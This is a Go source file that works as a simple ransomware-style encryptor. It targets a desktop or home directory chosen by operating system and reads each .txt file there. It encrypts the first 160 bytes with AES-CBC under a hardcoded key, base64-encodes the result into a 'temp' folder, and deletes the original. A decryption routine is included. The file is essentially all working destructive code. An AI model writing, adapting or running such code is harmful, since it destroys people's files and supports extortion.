package main

import (
	bytes2 "bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"errors"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

func main() {
	var path = ""
	switch runtime.GOOS {
	case "windows":
		path += "C:/users/administrator/desktop"
	case "darwin":
		path += "/Users/cocos/Desktop"

	case "linux":
		path += "/home"
	}

	fileInfo, err := ioutil.ReadDir(path)
	if err != nil {
		panic(err)
	}
	_, readFileError := os.Stat(filepath.Join(path, "temp"))
	if readFileError != nil || os.IsNotExist(readFileError) {
		_ = os.Mkdir(filepath.Join(path, "temp"), os.ModePerm)
	}

	for _, file := range fileInfo {
		if !file.IsDir() && strings.Contains(file.Name(), ".txt") {
			if bytes, err := ioutil.ReadFile(filepath.Join(path, file.Name())); err == nil {
				if len(bytes) < 10*aes.BlockSize {
					bytes = []byte(base64.StdEncoding.EncodeToString(bytes))
				} else {
					dis, err := aesEncrypt(bytes[:10*aes.BlockSize], getKey())
					if err != nil {
						bytes = []byte(base64.StdEncoding.EncodeToString(bytes))
					} else {
						cp := bytes[aes.BlockSize*10:]
						var buff = bytes2.Buffer{}
						buff.Write([]byte(dis))
						buff.Write(cp)
						bytes = []byte(base64.StdEncoding.EncodeToString(buff.Bytes()))
					}
				}
				if werr := ioutil.WriteFile(filepath.Join(path, "temp", file.Name()), bytes, file.Mode()); werr == nil {
					_ = os.Remove(filepath.Join(path, file.Name()))
				}

			}
		}
	}

	println("done")

}

func getKey() []byte {
	var key = "qwertyuiohnfj874"
	return []byte(key)
}

func aesEncrypt(src []byte, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", errors.New("创建aes密钥失败")
	}
	ciphertext := make([]byte, aes.BlockSize+len(src))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return "", err
	}
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext[aes.BlockSize:], src)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func aesDecrypt(dis string, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, errors.New("创建aes密钥失败")
	}
	ciphertext, baseErr := base64.StdEncoding.DecodeString(dis)
	if baseErr != nil {
		return nil, baseErr
	}
	if len(ciphertext) < aes.BlockSize {
		panic("密文不正确")
	}
	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]
	if len(ciphertext)%aes.BlockSize != 0 {
		panic("ciphertext is not a multiple of the block size")
	}
	mode := cipher.NewCBCDecrypter(block, iv)
	// CryptBlocks can work in-place if the two arguments are the same.
	mode.CryptBlocks(ciphertext, ciphertext)
	return ciphertext, nil
}
